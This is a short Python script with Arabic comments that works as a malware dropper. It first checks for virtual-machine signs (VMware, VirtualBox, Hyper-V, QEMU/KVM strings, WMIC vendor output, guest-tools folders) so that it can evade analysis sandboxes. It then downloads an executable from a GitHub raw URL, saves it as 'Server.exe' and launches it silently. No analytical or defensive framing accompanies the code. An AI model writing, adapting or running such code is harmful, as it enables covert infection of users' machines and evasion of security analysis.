import requests
import os
import platform
import subprocess

# دالة لفحص إذا كانت البيئة افتراضية
def is_virtual_machine():
    system = platform.system()
    machine = platform.machine()

    # التحقق من أنظمة معينة تشير إلى بيئة افتراضية
    if "VMware" in platform.uname().release or "VirtualBox" in platform.uname().release:
        return True
    if system == "Linux" and ("QEMU" in machine or "KVM" in machine):
        return True

    # التحقق من وجود أجهزة VMware أو Hyper-V
    if system == "Windows":
        try:
            output = subprocess.check_output("wmic csproduct get vendor, name", shell=True, text=True)
            if "VMware" in output or "VirtualBox" in output or "Parallels" in output or "Virtual" in output:
                return True
        except Exception:
            pass
            
    # التحقق من وجود برامج معينة
    try:
        if system == "Windows":
            # فحص وجود VMware Tools أو VirtualBox Guest Additions
            if os.path.exists("C:\\Program Files\\VMware\\VMware Tools") or \
               os.path.exists("C:\\Program Files\\Oracle\\VirtualBox Guest Additions") or \
               os.path.exists("C:\\Program Files\\Microsoft\\Hyper-V"):
                return True
    except Exception:
        pass

    return False

# تحميل البرنامج من الرابط وتشغيله
def download_and_run_program():
    download_url = "https://github.com/ItsChanGat/Test/raw/refs/heads/main/system.exe"
    download_path = os.path.join(os.path.dirname(__file__), "Server.exe")
    
    # تحميل البرنامج
    response = requests.get(download_url, stream=True)
    if response.status_code == 200:
        with open(download_path, "wb") as file:
            for chunk in response.iter_content(1024):
                file.write(chunk)
        
        # تشغيل البرنامج بشكل صامت
        subprocess.Popen([download_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# فحص البيئة الافتراضية وتشغيل البرنامج إذا كانت البيئة سليمة
if not is_virtual_machine():
    download_and_run_program()
